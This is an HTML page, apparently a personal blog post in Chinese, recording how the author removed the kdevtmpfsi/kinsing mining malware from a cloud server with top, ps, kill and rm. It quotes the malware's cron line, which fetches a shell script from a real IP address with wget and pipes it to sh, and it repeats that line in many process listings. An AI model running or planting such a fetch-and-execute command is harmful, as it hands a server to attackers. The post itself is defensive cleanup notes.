@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width,initial-scale=1">
+
+		
+		<title>云服务器清理病毒kdevtmpfsi &middot; ShixiangWang
+王诗翔</title>
+		
+		<meta property="og:title" content="云服务器清理病毒kdevtmpfsi - ShixiangWang
+王诗翔">
+		
+		<meta property="og:type" content="article">
+		
+
+		
+			
+			<meta property="description" content="清理腾讯云上的病毒程序">
+			<meta property="og:description" content="清理腾讯云上的病毒程序">
+			
+			
+    	<meta property="twitter:card" content="summary">
+  		<meta property="twitter:image" content="/apple-touch-icon-152x152.png">
+			
+		
+
+		
+		
+		<meta name="twitter:creator" content="@WangShxiang">
+		<meta name="twitter:site" content="https://shixiangwang.github.io">
+		
+		
+
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+		<link rel="stylesheet" href="../../css/poole.css">
+		<link rel="stylesheet" href="../../css/syntax.css">
+		<link rel="stylesheet" href="../../css/hyde.css">
+		
+		
+		<link rel="stylesheet" href="../../css/hamburgers.css">
+		
+		<link rel="stylesheet" href="../../css/custom.css">
+		
+		
+
+<link rel="apple-touch-icon-precomposed" sizes="57x57" href="../../apple-touch-icon-57x57.png" />
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="../../apple-touch-icon-114x114.png" />
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="../../apple-touch-icon-72x72.png" />
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../apple-touch-icon-144x144.png" />
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="../../apple-touch-icon-120x120.png" />
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../apple-touch-icon-152x152.png" />
+<link rel="icon" type="image/png" href="../../favicon-32x32.png" sizes="32x32" />
+<link rel="icon" type="image/png" href="../../favicon-16x16.png" sizes="16x16" />
+<meta name="application-name" content="Garrick Aden-Buie"/>
+<meta name="msapplication-TileColor" content="#002B36" />
+<meta name="msapplication-TileImage" content="/mstile-144x144.png" />
+<meta name="theme-color" content="#ffffff">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="Garrick Aden-Buie">
+
+<link href="../../css/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<script defer src="../../js/van11y-accessible-hide-show-aria.min.js"></script>
+
+<script defer src="../../js/toc.js"></script>
+
+
+
+		<link href="../../blog/clean-virus-in-cloud-server" rel="canonical">
+	</head>
+
+	<body class="restyled-garrick  h-entry">
+		<main class="content container" role="main">
+			<article class="post">
+				<header>
+					<a class="u-url" href="../../blog/clean-virus-in-cloud-server">
+						<h1 class="post-title p-name">云服务器清理病毒kdevtmpfsi</h1>
+					</a>
+					<h3 class="post-author">王诗翔</h3>
+					<time class="post-date dt-published" datetime="2021-09-08T00:00:00Z">Wednesday, 8 September 2021</time>
+					
+				</header>
+				<div class="post-content e-content">
+					<p>云服务器一段时间没使用就经常能发现存在挖矿病毒，也不知道怎么进来的。
+也不知道各种云服务商干啥去了，一般能本地使用电脑还是不建议使用云服务器。</p>
+<p>本文记录下清理病毒的大体流程，防止脑子总是忘记，又不是需要它。</p>
+<h2 id="查看占cpu任务名">查看占CPU任务名</h2>
+<p>这种一般top就可以了。</p>
+<div class="highlight"><pre style=";-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ top -H
+
+top - 19:47:30 up <span style="color:#666">72</span> days,  4:01,  <span style="color:#666">1</span> user,  load average: 3.46, 3.17, 3.12
+Threads: <span style="color:#666">357</span> total,   <span style="color:#666">5</span> running, <span style="color:#666">352</span> sleeping,   <span style="color:#666">0</span> stopped,   <span style="color:#666">0</span> zombie
+%Cpu<span style="color:#666">(</span>s<span style="color:#666">)</span>: 98.7 us,  1.3 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+KiB Mem :  <span style="color:#666">1882016</span> total,    <span style="color:#666">69388</span> free,   <span style="color:#666">579844</span> used,  <span style="color:#666">1232784</span> buff/cache
+KiB Swap:  <span style="color:#666">2097148</span> total,  <span style="color:#666">2002172</span> free,    <span style="color:#666">94976</span> used.  <span style="color:#666">1106516</span> avail Mem 
+
+  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                               
+<span style="color:#666">24665</span> zd        <span style="color:#666">20</span>   <span style="color:#666">0</span>  <span style="color:#666">710928</span> <span style="color:#666">265496</span>    <span style="color:#666">672</span> R 98.0 14.1   3088:23 kdevtmpfsi                                                                            
+ <span style="color:#666">4332</span> wsx       <span style="color:#666">20</span>   <span style="color:#666">0</span>  <span style="color:#666">162392</span>   <span style="color:#666">2536</span>   <span style="color:#666">1600</span> R  0.3  0.1   0:00.02 top                                                                                   
+<span style="color:#666">18025</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>  <span style="color:#666">744796</span>  <span style="color:#666">14724</span>   <span style="color:#666">2060</span> S  0.3  0.8   7:15.89 barad_agent                                                                           
+    <span style="color:#666">1</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>   <span style="color:#666">43744</span>   <span style="color:#666">3492</span>   <span style="color:#666">2252</span> S  0.0  0.2  14:14.25 systemd                                                                               
+    <span style="color:#666">2</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:01.60 kthreadd                                                                              
+    <span style="color:#666">4</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 kworker/0:0H                                                                          
+    <span style="color:#666">6</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   2:20.00 ksoftirqd/0                                                                           
+    <span style="color:#666">7</span> root      rt   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 migration/0                                                                           
+    <span style="color:#666">8</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 rcu_bh                                                                                
+    <span style="color:#666">9</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> R  0.0  0.0  11:28.07 rcu_sched                                                                             
+   <span style="color:#666">10</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 lru-add-drain                                                                         
+   <span style="color:#666">11</span> root      rt   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:21.41 watchdog/0                                                                            
+   <span style="color:#666">13</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 kdevtmpfs                                                                             
+   <span style="color:#666">14</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 netns                                                                                 
+   <span style="color:#666">15</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:01.40 khungtaskd                                                                            
+   <span style="color:#666">16</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.03 writeback                                                                             
+   <span style="color:#666">17</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 kintegrityd                                                                           
+   <span style="color:#666">18</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 bioset                                                                                
+   <span style="color:#666">19</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 bioset                                                                                
+   <span style="color:#666">20</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 bioset                                                                                
+   <span style="color:#666">21</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 kblockd                                                                               
+   <span style="color:#666">22</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 md                                                                                    
+   <span style="color:#666">23</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 edac-poller                                                                           
+   <span style="color:#666">24</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 watchdogd                                                                             
+   <span style="color:#666">30</span> root      <span style="color:#666">20</span>   <span style="color:#666">0</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:26.73 kswapd0                                                                               
+   <span style="color:#666">31</span> root      <span style="color:#666">25</span>   <span style="color:#666">5</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 ksmd                                                                                  
+   <span style="color:#666">32</span> root      <span style="color:#666">39</span>  <span style="color:#666">19</span>       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:07.05 khugepaged                                                                            
+   <span style="color:#666">33</span> root       <span style="color:#666">0</span> -20       <span style="color:#666">0</span>      <span style="color:#666">0</span>      <span style="color:#666">0</span> S  0.0  0.0   0:00.00 crypto      
+</code></pre></div><h2 id="查看相应的病毒文件">查看相应的病毒文件</h2>
+<p>一般病毒都都有守护进程，你杀掉会重新启动，必须删除文件的同时，去掉可能存在的定时
+任务。</p>
+<div class="highlight"><pre style=";-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash"><span style="color:#666">[</span>wsx@VM-0-5-centos ~<span style="color:#666">]</span>$ ps -ef | grep kinsing
+wsx       <span style="color:#666">4572</span>  <span style="color:#666">2594</span>  <span style="color:#666">0</span> 19:48 pts/0    00:00:00 grep --color<span style="color:#666">=</span>auto kinsing
+zd       <span style="color:#666">23244</span>     <span style="color:#666">1</span>  <span style="color:#666">0</span> 8月01 ?       00:03:42 /tmp/kinsing
+<span style="color:#666">[</span>wsx@VM-0-5-centos ~<span style="color:#666">]</span>$ ps -ef | grep kdevtmpfsi
+wsx       <span style="color:#666">4574</span>  <span style="color:#666">2594</span>  <span style="color:#666">0</span> 19:49 pts/0    00:00:00 grep --color<span style="color:#666">=</span>auto kdevtmpfsi
+zd       <span style="color:#666">25128</span>     <span style="color:#666">1</span> <span style="color:#666">97</span> 8月01 ?       37-09:55:38 /tmp/kdevtmpfsi
+</code></pre></div><p>查看指定用户的定时任务：</p>
+<div class="highlight"><pre style=";-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ sudo crontab -e -u zd
+* * * * * wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+</code></pre></div><p>我们可以看到有个定时任务，就是一个sh脚本。</p>
+<h2 id="清除">清除</h2>
+<p>把这个定时任务删除，同时杀掉上面的进程。</p>
+<div class="highlight"><pre style=";-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash"><span style="color:#666">[</span>wsx@VM-0-5-centos ~<span style="color:#666">]</span>$ sudo <span style="color:#008000">kill</span> -9 <span style="color:#666">25128</span>
+<span style="color:#666">[</span>wsx@VM-0-5-centos ~<span style="color:#666">]</span>$ sudo <span style="color:#008000">kill</span> -9 <span style="color:#666">23244</span>
+<span style="color:#666">[</span>wsx@VM-0-5-centos ~<span style="color:#666">]</span>$ sudo rm /tmp/kinsing
+<span style="color:#666">[</span>wsx@VM-0-5-centos ~<span style="color:#666">]</span>$ sudo rm /tmp/kdevtmpfsi 
+</code></pre></div><p>查看top，看有什么遗漏没有。发现还有大量未知的shell运行，进行批量删除：</p>
+<div class="highlight"><pre style=";-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash"><span style="color:#666">[</span>zd@VM-0-5-centos spool<span style="color:#666">]</span>$ ps -ef | grep <span style="color:#ba2121">&#39;http://195&#39;</span>
+zd         <span style="color:#666">729</span>   <span style="color:#666">726</span>  <span style="color:#666">0</span> 19:25 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd         <span style="color:#666">731</span>   <span style="color:#666">729</span>  <span style="color:#666">0</span> 19:25 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd         <span style="color:#666">890</span>   <span style="color:#666">889</span>  <span style="color:#666">0</span> 19:26 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd         <span style="color:#666">893</span>   <span style="color:#666">890</span>  <span style="color:#666">0</span> 19:26 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">1052</span>  <span style="color:#666">1051</span>  <span style="color:#666">0</span> 19:27 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">1054</span>  <span style="color:#666">1052</span>  <span style="color:#666">0</span> 19:27 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">1216</span>  <span style="color:#666">1214</span>  <span style="color:#666">0</span> 19:28 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">1218</span>  <span style="color:#666">1216</span>  <span style="color:#666">0</span> 19:28 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">1367</span>  <span style="color:#666">1366</span>  <span style="color:#666">0</span> 19:29 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">1370</span>  <span style="color:#666">1367</span>  <span style="color:#666">0</span> 19:29 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">1528</span>  <span style="color:#666">1523</span>  <span style="color:#666">0</span> 19:30 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">1531</span>  <span style="color:#666">1528</span>  <span style="color:#666">0</span> 19:30 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">1689</span>  <span style="color:#666">1688</span>  <span style="color:#666">0</span> 19:31 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">1692</span>  <span style="color:#666">1689</span>  <span style="color:#666">0</span> 19:31 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">1843</span>  <span style="color:#666">1842</span>  <span style="color:#666">0</span> 19:32 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">1845</span>  <span style="color:#666">1843</span>  <span style="color:#666">0</span> 19:32 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">2001</span>  <span style="color:#666">2000</span>  <span style="color:#666">0</span> 19:33 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">2004</span>  <span style="color:#666">2001</span>  <span style="color:#666">0</span> 19:33 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">2158</span>  <span style="color:#666">2156</span>  <span style="color:#666">0</span> 19:34 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">2159</span>  <span style="color:#666">2158</span>  <span style="color:#666">0</span> 19:34 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">2320</span>  <span style="color:#666">2318</span>  <span style="color:#666">0</span> 19:35 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">2324</span>  <span style="color:#666">2320</span>  <span style="color:#666">0</span> 19:35 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">2469</span>  <span style="color:#666">2468</span>  <span style="color:#666">0</span> 19:36 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">2472</span>  <span style="color:#666">2469</span>  <span style="color:#666">0</span> 19:36 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">2686</span>  <span style="color:#666">2685</span>  <span style="color:#666">0</span> 19:37 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">2688</span>  <span style="color:#666">2686</span>  <span style="color:#666">0</span> 19:37 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">2830</span>  <span style="color:#666">2829</span>  <span style="color:#666">0</span> 19:38 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">2832</span>  <span style="color:#666">2830</span>  <span style="color:#666">0</span> 19:38 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">2992</span>  <span style="color:#666">2991</span>  <span style="color:#666">0</span> 19:39 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">2994</span>  <span style="color:#666">2992</span>  <span style="color:#666">0</span> 19:39 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">3151</span>  <span style="color:#666">3148</span>  <span style="color:#666">0</span> 19:40 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">3154</span>  <span style="color:#666">3151</span>  <span style="color:#666">0</span> 19:40 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">3302</span>  <span style="color:#666">3301</span>  <span style="color:#666">0</span> 19:41 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">3304</span>  <span style="color:#666">3302</span>  <span style="color:#666">0</span> 19:41 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">3473</span>  <span style="color:#666">3472</span>  <span style="color:#666">0</span> 19:42 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">3475</span>  <span style="color:#666">3473</span>  <span style="color:#666">0</span> 19:42 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">3631</span>  <span style="color:#666">3629</span>  <span style="color:#666">0</span> 19:43 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">3633</span>  <span style="color:#666">3631</span>  <span style="color:#666">0</span> 19:43 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">3785</span>  <span style="color:#666">3784</span>  <span style="color:#666">0</span> 19:44 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">3787</span>  <span style="color:#666">3785</span>  <span style="color:#666">0</span> 19:44 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">3948</span>  <span style="color:#666">3947</span>  <span style="color:#666">0</span> 19:45 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">3950</span>  <span style="color:#666">3948</span>  <span style="color:#666">0</span> 19:45 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">4107</span>  <span style="color:#666">4105</span>  <span style="color:#666">0</span> 19:46 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">4109</span>  <span style="color:#666">4107</span>  <span style="color:#666">0</span> 19:46 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">4263</span>  <span style="color:#666">4262</span>  <span style="color:#666">0</span> 19:47 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">4265</span>  <span style="color:#666">4263</span>  <span style="color:#666">0</span> 19:47 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">4427</span>  <span style="color:#666">4426</span>  <span style="color:#666">0</span> 19:48 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">4430</span>  <span style="color:#666">4427</span>  <span style="color:#666">0</span> 19:48 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">4577</span>  <span style="color:#666">4576</span>  <span style="color:#666">0</span> 19:49 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">4579</span>  <span style="color:#666">4577</span>  <span style="color:#666">0</span> 19:49 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">4737</span>  <span style="color:#666">4736</span>  <span style="color:#666">0</span> 19:50 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">4740</span>  <span style="color:#666">4737</span>  <span style="color:#666">0</span> 19:50 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">4896</span>  <span style="color:#666">4894</span>  <span style="color:#666">0</span> 19:51 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh &gt; /dev/null 2&gt;&amp;<span style="color:#666">1</span>
+zd        <span style="color:#666">4899</span>  <span style="color:#666">4896</span>  <span style="color:#666">0</span> 19:51 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
+zd        <span style="color:#666">7879</span>  <span style="color:#666">7445</span>  <span style="color:#666">0</span> 20:09 pts/0    00:00:00 grep --color<span style="color:#666">=</span>auto http://195
+</code></pre></div><div class="highlight"><pre style=";-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash"><span style="color:#666">[</span>zd@VM-0-5-centos spool<span style="color:#666">]</span>$ ps -ef | grep <span style="color:#ba2121">&#39;http://195&#39;</span> | grep -v grep | awk <span style="color:#ba2121">&#39;{print $2}&#39;</span> | xargs <span style="color:#008000">kill</span> -9
+</code></pre></div><h2 id="其他">其他</h2>
+<p>还可以检查是否有可疑的启动项，公钥等。</p>
+<blockquote>
+<p>参考：<a href="https://blog.csdn.net/lingeio/article/details/103968393">https://blog.csdn.net/lingeio/article/details/103968393</a></p>
+</blockquote>
+
+				</div>
+				<footer class="footer">
+				  <hr>
+<div class="post-tags">
+
+<p>
+  <svg xmlns="http://www.w3.org/2000/svg" class="octicon" width="20" height="24" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M8 2H6V0h2v2zm4 5H2c-.55 0-1-.45-1-1V4c0-.55.45-1 1-1h10l2 2-2 2zM8 4H6v2h2V4zM6 16h2V8H6v8z"/></svg>
+	
+	<a class="p-category" href="../../categories/blog/">Blog</a>
+</p>
+
+
+<p>
+  <svg xmlns="http://www.w3.org/2000/svg" class="octicon" width="20" height="24" viewBox="0 0 15 16"><path fill-rule="evenodd" d="M7.73 1.73C7.26 1.26 6.62 1 5.96 1H3.5C2.13 1 1 2.13 1 3.5v2.47c0 .66.27 1.3.73 1.77l6.06 6.06c.39.39 1.02.39 1.41 0l4.59-4.59a.996.996 0 0 0 0-1.41L7.73 1.73zM2.38 7.09c-.31-.3-.47-.7-.47-1.13V3.5c0-.88.72-1.59 1.59-1.59h2.47c.42 0 .83.16 1.13.47l6.14 6.13-4.73 4.73-6.13-6.15zM3.01 3h2v2H3V3h.01z"/></svg>
+	
+	<a class="p-tag" href="../../tags/linux/">Linux</a>
+
+</p>
+</div>
+
+				</footer>
+			</article>
+		</main>
+			  <button class="hamburger hamburger--arrow is-active" type="button" onclick="document.getElementsByClassName('sidebar')[0].classList.toggle('collapsed');document.getElementsByClassName('content')[0].classList.toggle('expanded');document.getElementsByClassName('hamburger')[0].classList.toggle('is-active');document.getElementsByClassName('hamburger-inner')[0].classList.toggle('is-active')">
+      <span class="hamburger-box">
+        <span class="hamburger-inner"></span>
+      </span>
+    </button>
+		<aside class="sidebar">
+			<div class="container sidebar-sticky">
+				<header class="sidebar-about h-card vcard p-author">
+					
+					<a class="u-url u-uid" rel="me" href="../../">
+						<img class="u-photo" src="https://avatars.githubusercontent.com/u/25057508?v=4" width=128 height=128 />
+					</a>
+					
+
+					
+					<span class="site-title u-name fn">
+					  <a class="u-url u-uid" rel="me" href="../../">ShixiangWang
+王诗翔</a>
+				  </span>
+					
+
+					<p class="lead p-note">
+						 Bioinformatics Scholar. Cancer Researcher. Data Scientist. #rstats #golang. Always learning something new. 
+					</p>
+
+					<nav>
+						<ul class="sidebar-nav">
+							
+							<li><a href="../../about/"> About </a></li>
+							
+							<li><a href="../../blog/"> Blog </a></li>
+							
+							<li><a href="../../project/"> Projects </a></li>
+							
+							<li><a href="http://42.192.87.178:3838/"> Shiny Apps </a></li>
+							
+							<li><a href="../../talk/"> Talks </a></li>
+							
+							<li><a href="https://github.com/ShixiangWang/self-study/discussions"> Discuss with me? </a></li>
+							
+							<li><a href="https://shixiangwang.netlify.app/"> Mirror #1 </a></li>
+							
+							<li><a href="https://shixiangwang.github.io/"> Mirror #2 </a></li>
+							
+						</ul>
+					</nav>
+
+					
+						<div class="contact">
+						  
+							<ul class="contact-list">
+								
+								<li>
+									
+									  
+		  							  <a href="https://twitter.com/WangShxiang" class="u-url url" rel="me" title="Twitter" aria-label="Twitter">
+		  						    <i class='fab fa-twitter fa-fw'></i>
+		  							  </a>
+		  						  
+								
+								</li>
+								
+								<li>
+									
+									  
+		  							  <a href="https://github.com/ShixiangWang" class="u-url url" rel="me" title="GitHub" aria-label="GitHub">
+		  						    <i class='fab fa-github fa-fw'></i>
+		  							  </a>
+		  						  
+								
+								</li>
+								
+								<li>
+									
+		  							<a href="mailto:shixiang1994wang@gmail.com" class="u-email email" rel="me" title="Email" aria-label="Email">
+		  							<i class='fa fa-envelope fa-fw'></i>
+		  							  
+		  							</a>
+									
+								</li>
+								
+								<li>
+									
+									  
+		  							  <a href="https://shixiangwang.github.io/home/logo/qrcode.jpg" class="u-url url" rel="me" title="Bandcamp" aria-label="Bandcamp">
+		  						    <i class='fab fa-bandcamp fa-fw'></i>
+		  							  </a>
+		  						  
+								
+								</li>
+								
+							</ul>
+						</div>
+					
+				</header>
+
+				<footer>&copy; 2021. All rights reserved. </footer>
+				 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_pv">本站总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;次</span>
+			</div>
+		</aside>
+
